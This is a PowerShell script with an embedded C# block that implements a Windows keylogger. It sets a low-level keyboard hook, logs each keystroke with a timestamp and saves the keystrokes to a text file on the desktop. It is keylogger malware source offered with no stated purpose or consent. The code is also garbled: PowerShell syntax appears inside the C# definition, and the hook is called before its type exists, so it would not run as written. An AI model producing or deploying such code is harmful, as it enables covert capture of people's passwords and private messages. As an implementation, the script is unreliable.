$LogFile = "C:\Users\Admin\Desktop\keylog.txt"
$KeyLogs = New-Object System.Collections.ArrayList

Function Start-Keylogger {
    Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Threading;
        public static class Keylogger {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private static LowLevelKeyboardProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;
            public static void SetHook() {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule) {
                    _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            public static void RemoveHook() {
                UnhookWindowsHookEx(_hookID);
            }
            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    _ = AddKeyToLogs(vkCode);
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            private static bool AddKeyToLogs(int vkCode) {
                $Char = [char]::ToLower([System.Convert]::ToChar(vkCode))
                if ([char]::IsLetterOrDigit($Char) -or [char]::IsPunctuation($Char) -or $Char -eq ' ') {
                    $KeyLogs.Add("$([DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')) - $Char") | Out-Null
                }
                return $true
            }
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
"@
    [System.Windows.Forms.Application]::Run()
}

Function Stop-Keylogger {
    [Keylogger]::RemoveHook()
}

Function Save-Keylogs {
    if ($KeyLogs.Count -gt 0) {
        Add-Content -Path $LogFile -Value $KeyLogs
        $KeyLogs.Clear()
    }
}

[Console]::CancelKeyPress.Add({
    Stop-Keylogger
    Save-Keylogs
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
})

[Keylogger]::SetHook()
Start-Keylogger